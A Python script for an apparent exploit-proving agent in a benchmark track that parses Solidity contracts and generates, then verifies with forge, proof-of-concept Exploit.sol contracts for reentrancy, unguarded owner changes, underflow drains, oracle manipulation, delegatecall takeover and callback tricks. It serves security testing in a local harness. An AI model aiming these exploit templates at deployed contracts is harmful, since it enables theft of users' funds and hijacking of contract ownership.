#!/usr/bin/env python3
"""TRUST404 Track 04 - improved autonomous exploit-proving agent (MVP).

What it does
------------
Reads a target contract + Invariants.sol + manifest.json, generates candidate
`Exploit.sol` PoCs, and *verifies each one for real* by running it through the
official harness (`harness/src/Harness.sol` via `forge test`). The first
candidate that makes `Invariants.checkAll` return `false` is emitted as the
proof. If nothing breaks an invariant within the budget, the agent abstains
(exit 1) rather than fabricate a PoC - which is exactly what the clean targets
(SafeVault, BoundedOwner) require.

Why it beats the baseline
-------------------------
* Multi-step exploits. The baseline's underflow template calls one function
  once; real drains need a *sequence* (e.g. underflow a credit balance, then
  redeem the ETH). This agent models that BadAccounting-style two-step drain and
  the NaiveOracle price-manipulation sequence.
* Precision. Detectors reason about *state-write-after-call* (reentrancy),
  *missing guards* (access control), and *unchecked subtraction without a
  balance check* (underflow) so they stay quiet on SafeVault / BoundedOwner.

Determinism
-----------
Every strategy is a fixed template filled from the parsed source; candidate
order is fixed and, where a choice is needed, broken with a `--seed`-keyed PRNG.
The LLM path (optional, only if ANTHROPIC_API_KEY is set) runs at temperature 0
and is used only as an extra *first* candidate; the offline heuristics are the
verified path. See METHOD.md.

CLI
---
    agent.py --contract <path> --invariants <path> --manifest <path> --out <dir>
             --timeout <sec> --seed <int> --max-attempts <int>

Exit codes: 0 found (PROVEN) · 1 not found in budget · 2 usage/internal error.
Outputs (--out): Exploit.sol (best candidate) and attempts.log.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

EXIT_FOUND = 0
EXIT_NOT_FOUND = 1
EXIT_ERROR = 2


# ── CLI ────────────────────────────────────────────────────────────────────

def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(prog="agent", description="TRUST404 Track 04 exploit agent (MVP)")
    p.add_argument("--contract", required=True)
    p.add_argument("--invariants", required=True)
    p.add_argument("--manifest", required=True)
    p.add_argument("--out", required=True)
    p.add_argument("--timeout", type=int, default=300)
    p.add_argument("--seed", type=int, default=0)
    p.add_argument("--max-attempts", type=int, default=5, dest="max_attempts")
    return p.parse_args(argv)


def log(msg: str) -> None:
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()


# ── Lightweight Solidity function extraction (brace matching) ────────────────

FUNC_HEAD = re.compile(r"function\s+(\w+)\s*\(([^)]*)\)\s*([^{;]*)(\{|;)")


class Fn:
    def __init__(self, name, params, header, body, mutability, visible):
        self.name = name
        self.params = params            # list of raw "type name" strings
        self.header = header
        self.body = body
        self.mutability = mutability    # 'payable'|'view'|'pure'|''
        self.visible = visible

    @property
    def ptypes(self) -> list[str]:
        out = []
        for p in self.params:
            toks = p.split()
            if toks:
                out.append(toks[0])
        return out

    def sig(self) -> str:
        return f"{self.name}({','.join(self.ptypes)})"


def extract_functions(source: str) -> list[Fn]:
    funcs: list[Fn] = []
    for m in FUNC_HEAD.finditer(source):
        name, params, tail, term = m.group(1), m.group(2), m.group(3), m.group(4)
        if term == ";":
            body = ""
        else:
            start = m.end() - 1
            depth = 0
            i = start
            for i in range(start, len(source)):
                if source[i] == "{":
                    depth += 1
                elif source[i] == "}":
                    depth -= 1
                    if depth == 0:
                        break
            body = source[start:i + 1]
        mutability = ""
        for kw in ("payable", "view", "pure"):
            if re.search(rf"\b{kw}\b", tail):
                mutability = kw
        visible = ("external" in tail or "public" in tail or
                   ("internal" not in tail and "private" not in tail))
        plist = [p.strip() for p in params.split(",") if p.strip()]
        funcs.append(Fn(name, plist, tail, body, mutability, visible))
    return funcs


OWNER_GUARDS = ("onlyOwner", "onlyAdmin", "onlyRole", "_checkOwner", "requiresAuth")
SELF_BAL = ("balances[msg.sender]", "balanceOf[msg.sender]", "_balances[msg.sender]", "credit[msg.sender]")


def has_owner_guard(fn: Fn) -> bool:
    if any(g in fn.header for g in OWNER_GUARDS):
        return True
    if re.search(r"require\s*\(\s*msg\.sender\s*==\s*(owner|_owner|admin|minter|governance)", fn.body):
        return True
    if re.search(r"require\s*\(\s*(owner|_owner|admin)\s*==\s*msg\.sender", fn.body):
        return True
    return False


def has_reentrancy_guard(fn: Fn) -> bool:
    if re.search(r"\bnonReentrant\b|\bnoReentrancy\b", fn.header):
        return True
    if re.search(r"require\s*\(\s*(!?\s*(locked|_locked|_status|entered|_entered))", fn.body):
        return True
    return False


# ── Strategy detectors -> candidate Exploit.sol ──────────────────────────────

def _reentry_candidate(funcs: list[Fn]):
    for f in funcs:
        if not f.visible or f.mutability in ("view", "pure"):
            continue
        idx = f.body.find(".call{value:")
        if idx == -1:
            idx = f.body.find(".call{ value:")
        if idx == -1:
            continue
        after = f.body[idx:]
        writes_after = ("-=" in after or "= 0" in after or "delete " in after
                        or re.search(r"balances?\s*\[[^\]]+\]\s*=", after)
                        or re.search(r"balanceOf\s*\[[^\]]+\]\s*=", after))
        if not writes_after:
            continue          # CEI-safe (state written before the call) -> skip
        if has_reentrancy_guard(f):
            continue
        return f
    return None


def render_reentrancy(fn: Fn) -> str:
    if not fn.params:
        wsig = f"{fn.name}() external;"
        wcall = f"{fn.name}()"
    elif len(fn.ptypes) == 1 and fn.ptypes[0].startswith("uint"):
        wsig = f"{fn.name}(uint256) external;"
        wcall = f"{fn.name}(DEP)"
    else:
        return ""  # shape not handled by this template
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {{
    function deposit() external payable;
    function {wsig}
}}

contract Exploit {{
    // reentrancy: {fn.name}() sends ETH before updating balances, so we re-enter
    // from receive() and withdraw our recorded balance repeatedly.
    uint256 constant DEP = 1 ether;
    ITarget t;
    uint256 hops;

    function run(address _t) external payable {{
        t = ITarget(_t);
        t.deposit{{value: DEP}}();
        t.{wcall};
    }}

    receive() external payable {{
        if (hops < 5 && address(t).balance >= DEP) {{
            hops++;
            t.{wcall};
        }}
    }}
}}
"""


def _sensitive_unguarded(funcs: list[Fn]):
    """Return (setowner_fn, arbitrary_withdraw_fn) among unguarded functions."""
    setowner = None
    arb_withdraw = None
    for f in funcs:
        if not f.visible or f.mutability in ("view", "pure"):
            continue
        if has_owner_guard(f):
            continue
        # (a) reassigns owner/admin with no guard
        if re.search(r"\b(owner|_owner|admin|_admin)\s*=\s*", f.body) and len(f.ptypes) <= 1:
            setowner = setowner or f
        # (b) sends contract ETH to a param address, not bound to caller balance
        sends = re.search(r"(\w+)\s*\.\s*call\s*\{\s*value\s*:", f.body)
        if sends and sends.group(1) not in ("msg",) and not any(s in f.body for s in SELF_BAL):
            if len(f.ptypes) >= 2 and f.ptypes[0] == "address" and f.ptypes[1].startswith("uint"):
                arb_withdraw = arb_withdraw or f
            elif len(f.ptypes) == 1 and f.ptypes[0] == "address":
                arb_withdraw = arb_withdraw or f
    return setowner, arb_withdraw


def render_set_owner(fn: Fn) -> str:
    arg = "address(this)" if fn.ptypes[:1] == ["address"] else ""
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {{ function {fn.name}(address) external; }}

contract Exploit {{
    // missing access control: {fn.name}() reassigns owner with no guard.
    function run(address _t) external payable {{
        ITarget(_t).{fn.name}({arg});
    }}
}}
"""


def render_arbitrary_withdraw(fn: Fn) -> str:
    if len(fn.ptypes) >= 2:
        iface = f"function {fn.name}(address,uint256) external;"
        call = f"{fn.name}(address(this), _t.balance)"
    else:
        iface = f"function {fn.name}(address) external;"
        call = f"{fn.name}(address(this))"
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {{ {iface} }}

contract Exploit {{
    // missing access control: {fn.name}() sends contract funds to an arbitrary
    // recipient with no owner guard -> drain the vault to ourselves.
    function run(address _t) external payable {{
        ITarget(_t).{call};
    }}
    receive() external payable {{}}
}}
"""


def _underflow_drain(funcs: list[Fn]):
    """Find (transfer-like underflowable fn, redeem-like payout fn)."""
    underflowable = None
    redeem = None
    for f in funcs:
        if not f.visible or f.mutability in ("view", "pure"):
            continue
        # unchecked subtraction on a balance map WITHOUT a preceding balance check
        if "unchecked" in f.body and re.search(r"balanceOf|balances|credit", f.body) and "-=" in f.body:
            has_check = re.search(r"require\s*\([^;]*(balanceOf|balances|credit)\s*\[\s*msg\.sender\s*\]\s*>=", f.body)
            if not has_check and len(f.ptypes) >= 2 and f.ptypes[0] == "address" and f.ptypes[1].startswith("uint"):
                underflowable = underflowable or f
        # redeem/withdraw that pays ETH out based on a uint amount arg
        if re.search(r"\.\s*call\s*\{\s*value\s*:", f.body) and len(f.ptypes) == 1 and f.ptypes[0].startswith("uint"):
            if re.search(r"(balanceOf|balances|credit)\s*\[\s*msg\.sender\s*\]", f.body):
                redeem = redeem or f
    if underflowable and redeem:
        return underflowable, redeem
    return None


def render_underflow_drain(transfer_fn: Fn, redeem_fn: Fn) -> str:
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {{
    function {transfer_fn.name}(address,uint256) external;
    function {redeem_fn.name}(uint256) external;
}}

contract Exploit {{
    // unchecked-underflow drain: {transfer_fn.name}() subtracts from our credit
    // with no balance check, so transferring 1 while holding 0 underflows our
    // balance to ~2**256. Then {redeem_fn.name}() lets us pull the contract's ETH.
    function run(address _t) external payable {{
        ITarget t = ITarget(_t);
        t.{transfer_fn.name}(address(0xdEaD), 1);
        t.{redeem_fn.name}(_t.balance);
    }}
    receive() external payable {{}}
}}
"""


def _oracle_manip(funcs: list[Fn], source: str):
    names = {f.name for f in funcs}
    if "borrow" in names and "spotPrice" in source and ("swapBorForCol" in source or "swapColForBor" in source):
        return True
    return False


def render_oracle_manip(source: str) -> str:
    # Target-shape-specific PoC for the NaiveOracle family: get borrow tokens
    # from the faucet, skew the constant-product pool to inflate COL's price,
    # deposit a little collateral, then borrow far more than its fair value so
    # totalDebt > totalCollateral (the solvency invariant).
    return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPool {
    function swapBorForCol(uint256) external;
    function sync() external;
    function spotPrice() external view returns (uint256);
    function reserveCol() external view returns (uint256);
}

interface IOracle {
    function faucet() external;
    function collateralToken() external view returns (address);
    function borrowToken() external view returns (address);
    function pool() external view returns (address);
    function depositCollateral(uint256) external;
    function borrow(uint256) external;
}

contract Exploit {
    function run(address _t) external payable {
        IOracle o = IOracle(_t);
        IERC20 col = IERC20(o.collateralToken());
        IERC20 bor = IERC20(o.borrowToken());
        IPool pool = IPool(o.pool());

        // 1) get some borrow-token from the faucet
        o.faucet();

        // 2) skew the pool: sell BOR for COL to push COL's price up and thin the
        //    COL reserve. Approve the pool to pull our BOR.
        bor.approve(address(pool), type(uint256).max);
        uint256 borBal = bor.balanceOf(address(this));
        pool.swapBorForCol(borBal / 2);

        // 3) deposit a small amount of the COL we just received as collateral
        uint256 colBal = col.balanceOf(address(this));
        col.approve(_t, type(uint256).max);
        o.depositCollateral(colBal);

        // 4) borrow against the inflated price - far beyond fair value
        uint256 price = pool.spotPrice();
        uint256 fairValue = colBal;                 // fair 1:1 value of collateral
        uint256 inflated = (colBal * price) / 1e18; // value the oracle believes
        uint256 want = inflated > fairValue ? inflated - 1 : inflated;
        o.borrow(want);
    }
    receive() external payable {}
}
"""


def _delegatecall_pwn(funcs: list[Fn], source: str):
    """Proxy that forwards unmatched calldata via delegatecall into a logic
    contract: any no-arg, unguarded function that reassigns owner/admin (e.g.
    `pwn()`) can be reached through the proxy and runs in the proxy's storage."""
    if "delegatecall" not in source:
        return None
    for f in funcs:
        if not f.visible or f.mutability in ("view", "pure"):
            continue
        if f.ptypes:                       # need a bare selector, no args
            continue
        if has_owner_guard(f):
            continue
        if re.search(r"\b(owner|_owner|admin|_admin)\s*=\s*msg\.sender", f.body):
            return f.name
    return None


def render_delegatecall_pwn(fn_name: str) -> str:
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Exploit {{
    // delegatecall proxy: the target forwards unmatched calldata via delegatecall
    // into a logic contract, so invoking {fn_name}() through the proxy runs it in
    // the proxy's storage context and reassigns owner to us.
    function run(address _t) external payable {{
        (bool ok, ) = _t.call(abi.encodeWithSignature("{fn_name}()"));
        require(ok, "delegatecall path failed");
    }}
    receive() external payable {{}}
}}
"""


def _malicious_callback(funcs: list[Fn], source: str):
    """Target trusts msg.sender to implement an interface method consistently,
    calling it (>=2x) in one tx. If the method returns bool and is non-view, a
    caller can answer 'safe' then 'unsafe' to flip the guarded state. The cast
    `Iface(msg.sender)` may be stored in a local, so we resolve via the interface
    (not an inline `Iface(msg.sender).method(` match)."""
    im = re.search(r"(\w+)\s*\(\s*msg\.sender\s*\)", source)
    if not im:
        return None
    iface = im.group(1)
    ib = re.search(rf"interface\s+{iface}\s*\{{(.*?)\}}", source, re.DOTALL)
    scope = ib.group(1) if ib else source
    for md in re.finditer(
            r"function\s+(\w+)\s*\(([^)]*)\)\s*external\s*(view\s*)?returns\s*\(([^)]*)\)", scope):
        method, params, isview, ret = md.group(1), md.group(2), md.group(3), md.group(4)
        if isview or not ret.strip().startswith("bool"):
            continue                       # view -> staticcall; non-bool -> not this toggle
        cb_types = ",".join(t.strip().split()[0] for t in params.split(",") if t.strip())
        for f in funcs:
            if not f.visible or f.mutability in ("view", "pure"):
                continue
            if f.body.count(f".{method}(") >= 2:   # called twice in one tx -> exploitable
                return (f, method, cb_types)
    return None


def render_malicious_callback(entry_fn: Fn, method: str, cb_types: str) -> str:
    args = []
    for t in entry_fn.ptypes:
        if t.startswith(("uint", "int")):
            args.append("1")
        elif t == "address":
            args.append("address(this)")
        elif t == "bool":
            args.append("true")
        else:
            args.append("0")
    call_args = ", ".join(args)
    entry_types = ",".join(entry_fn.ptypes)
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {{ function {entry_fn.name}({entry_types}) external; }}

contract Exploit {{
    // trust-the-caller callback: the target calls back into msg.sender's
    // {method}() more than once in a single tx and trusts a consistent answer.
    // We return the "safe" value first (to pass the guard) and the "unsafe"
    // value second (to flip the protected state).
    bool private stepped;

    function run(address _t) external payable {{
        ITarget(_t).{entry_fn.name}({call_args});
    }}

    function {method}({cb_types}) external returns (bool) {{
        if (!stepped) {{ stepped = true; return false; }}
        return true;
    }}

    receive() external payable {{}}
}}
"""


def build_candidates(source: str) -> list[tuple[str, str]]:
    """(strategy, exploit_code) in deterministic priority order. Only strategies
    whose preconditions match the source produce a candidate."""
    funcs = extract_functions(source)
    out: list[tuple[str, str]] = []

    setowner, arb = _sensitive_unguarded(funcs)
    if setowner:
        code = render_set_owner(setowner)
        if code:
            out.append((f"access-control:set-owner(fn={setowner.name})", code))

    reentry = _reentry_candidate(funcs)
    if reentry:
        code = render_reentrancy(reentry)
        if code:
            out.append((f"reentrancy(fn={reentry.name})", code))

    uf = _underflow_drain(funcs)
    if uf:
        out.append((f"unchecked-underflow-drain(fn={uf[0].name}->{uf[1].name})",
                    render_underflow_drain(uf[0], uf[1])))

    if arb:
        out.append((f"access-control:arbitrary-withdraw(fn={arb.name})",
                    render_arbitrary_withdraw(arb)))

    if _oracle_manip(funcs, source):
        out.append(("oracle-price-manipulation", render_oracle_manip(source)))

    dc = _delegatecall_pwn(funcs, source)
    if dc:
        out.append((f"delegatecall-proxy-pwn(fn={dc})", render_delegatecall_pwn(dc)))

    cb = _malicious_callback(funcs, source)
    if cb:
        out.append((f"malicious-callback(fn={cb[0].name}->{cb[1]})",
                    render_malicious_callback(cb[0], cb[1], cb[2])))

    return out


# ── forge verification (reuses the official harness _prove pipeline) ─────────

ATTEMPT_TEST = """// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {{Harness}} from "../src/Harness.sol";
import {{console2}} from "forge-std/console2.sol";
import {{{target_name}}} from "./_agent_target.sol";
import {{Invariants}} from "./_agent_invariants.sol";
import {{Exploit}} from "./_agent_exploit.sol";
{setup_import}
contract AgentAttemptTest is Harness {{
    function test_attempt() public {{
        {deploy_line}
        Invariants invariants = new Invariants();
        Exploit exploit = new Exploit();
        (bool proven, string memory violated) = _prove(
            address(target), address(invariants), address(exploit),
            {bn}, {ts}, DEFAULT_EXPLOIT_FUNDING_WEI
        );
        console2.log("AGENT_RESULT", proven ? "PROVEN" : "NOT_PROVEN", violated);
    }}
}}
"""


def harness_dir() -> Path:
    env = os.environ.get("TRUST404_HARNESS_DIR")
    if env:
        return Path(env)
    return Path(__file__).resolve().parent.parent / "harness"


def verify_candidate(hdir: Path, target_path: Path, invariants_path: Path,
                     exploit_code: str, manifest: dict, target_name: str) -> tuple[bool, str, str]:
    scratch = hdir / "test"
    target_dst = scratch / "_agent_target.sol"
    invariants_dst = scratch / "_agent_invariants.sol"
    exploit_dst = scratch / "_agent_exploit.sol"
    attempt_dst = scratch / "_agent_attempt.t.sol"
    setup_dst = scratch / "_agent_setup.sol"

    determ = manifest.get("determinism", {})
    deploy = manifest.get("deploy", {})
    bn = determ.get("block_number", 0)
    ts = determ.get("block_timestamp", 0)
    setup = deploy.get("setup")

    if setup:
        setup_src = target_path.parent.parent / setup  # manifest dir / Setup.s.sol
        deploy_line = "address target = (new Setup()).run();"
        setup_import = 'import {Setup} from "./_agent_setup.sol";'
    else:
        setup_src = None
        deploy_line = f"{target_name} t = new {target_name}(); address target = address(t);"
        setup_import = ""

    created = []
    try:
        shutil.copyfile(target_path, target_dst); created.append(target_dst)
        shutil.copyfile(invariants_path, invariants_dst); created.append(invariants_dst)
        exploit_dst.write_text(exploit_code, encoding="utf-8"); created.append(exploit_dst)
        if setup_src is not None:
            code = setup_src.read_text(encoding="utf-8")
            code = re.sub(r'"[^"]*src/' + re.escape(target_name) + r'\.sol"', '"./_agent_target.sol"', code)
            setup_dst.write_text(code, encoding="utf-8"); created.append(setup_dst)
        test_src = ATTEMPT_TEST.format(target_name=target_name, setup_import=setup_import,
                                       deploy_line=deploy_line, bn=bn, ts=ts)
        attempt_dst.write_text(test_src, encoding="utf-8"); created.append(attempt_dst)

        proc = subprocess.run(
            ["forge", "test", "--match-path", "test/_agent_attempt.t.sol", "-vv"],
            cwd=hdir, capture_output=True, text=True, timeout=180,
        )
        out = proc.stdout + proc.stderr
        m = re.search(r"AGENT_RESULT\s+(PROVEN|NOT_PROVEN)\s*(\S*)", out)
        if m:
            return (m.group(1) == "PROVEN"), m.group(2), ""
        tail = "\n".join(out.strip().splitlines()[-12:])
        return False, "", tail or f"forge exit {proc.returncode}"
    finally:
        for f in created:
            try:
                f.unlink()
            except OSError:
                pass


# ── LLM path (optional first candidate; degrades silently offline) ───────────

def llm_candidate(target_source: str, invariants_source: str, manifest: dict) -> str | None:
    import urllib.request
    import urllib.error
    api_key = os.environ.get("ANTHROPIC_API_KEY") or os.environ.get("LLM_API_KEY")
    if not api_key:
        return None
    model = os.environ.get("TRUST404_AGENT_MODEL", "claude-haiku-4-5")
    prompt = (
        "Write an Exploit.sol that breaks the target's invariant.\n"
        "Output ONLY: contract Exploit { function run(address target) external payable { ... } }\n"
        "Include SPDX + pragma, define any interfaces inline (no imports).\n\n"
        "TARGET:\n```solidity\n" + target_source + "\n```\n\n"
        "INVARIANTS:\n```solidity\n" + invariants_source + "\n```\n"
    )
    body = json.dumps({
        "model": model, "max_tokens": 2000, "temperature": 0,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/messages", data=body,
        headers={"Content-Type": "application/json", "x-api-key": api_key,
                 "anthropic-version": "2023-06-01"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            payload = json.loads(resp.read().decode())
        text = "".join(b.get("text", "") for b in payload.get("content", []) if b.get("type") == "text")
    except Exception:
        return None
    m = re.search(r"```(?:solidity)?\s*(.*?)```", text, re.DOTALL)
    code = m.group(1).strip() if m else text.strip()
    if "contract Exploit" in code and "function run(address" in code:
        return code
    return None


# ── main ─────────────────────────────────────────────────────────────────────

def write_out(out_dir: Path, code: str, log_lines: list[str]) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "Exploit.sol").write_text(code, encoding="utf-8")
    (out_dir / "attempts.log").write_text("\n".join(log_lines) + ("\n" if log_lines else ""), encoding="utf-8")


NOOP = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Exploit { function run(address) external payable {} }
"""


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    out_dir = Path(args.out)
    logl: list[str] = []

    cpath, ipath, mpath = Path(args.contract), Path(args.invariants), Path(args.manifest)
    for p, lbl in ((cpath, "--contract"), (ipath, "--invariants"), (mpath, "--manifest")):
        if not p.is_file():
            log(f"error: {lbl} not found: {p}")
            write_out(out_dir, NOOP, logl)
            return EXIT_ERROR

    try:
        manifest = json.loads(mpath.read_text(encoding="utf-8"))
    except Exception as e:
        log(f"error: manifest parse: {e}")
        write_out(out_dir, NOOP, logl)
        return EXIT_ERROR

    target_name = manifest.get("target", {}).get("name")
    if not target_name:
        log("error: manifest.target.name missing")
        write_out(out_dir, NOOP, logl)
        return EXIT_ERROR

    hdir = harness_dir()
    if shutil.which("forge") is None or not (hdir / "src" / "Harness.sol").is_file():
        log(f"error: forge or harness not available (harness={hdir})")
        write_out(out_dir, NOOP, logl)
        return EXIT_ERROR

    source = cpath.read_text(encoding="utf-8")
    inv_source = ipath.read_text(encoding="utf-8")

    candidates = build_candidates(source)
    if os.environ.get("ANTHROPIC_API_KEY") or os.environ.get("LLM_API_KEY"):
        candidates = [("llm", None)] + candidates
    if not candidates:
        candidates = [("no-strategy-matched", NOOP)]

    deadline = time.monotonic() + args.timeout
    best = None
    n = 0
    for strategy, code in candidates:
        if n >= args.max_attempts or time.monotonic() >= deadline:
            break
        n += 1
        if code is None:  # lazy LLM candidate
            code = llm_candidate(source, inv_source, manifest)
            if code is None:
                logl.append(f"{n}\t{strategy}\tSKIPPED\t(no key / offline / parse fail)")
                n -= 1
                continue
        best = code
        try:
            proven, violated, note = verify_candidate(hdir, cpath, ipath, code, manifest, target_name)
        except subprocess.TimeoutExpired:
            logl.append(f"{n}\t{strategy}\tTIMEOUT\t-")
            continue
        if proven:
            logl.append(f"{n}\t{strategy}\tPROVEN\t{violated}")
            write_out(out_dir, code, logl)
            log(f"PROVEN via {strategy} (violated={violated})")
            return EXIT_FOUND
        logl.append(f"{n}\t{strategy}\t{'NOT_PROVEN' if not note else 'ERROR'}\t{note[:100]}")

    write_out(out_dir, best or NOOP, logl)
    log("no invariant broken within budget -> abstaining (exit 1)")
    return EXIT_NOT_FOUND


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
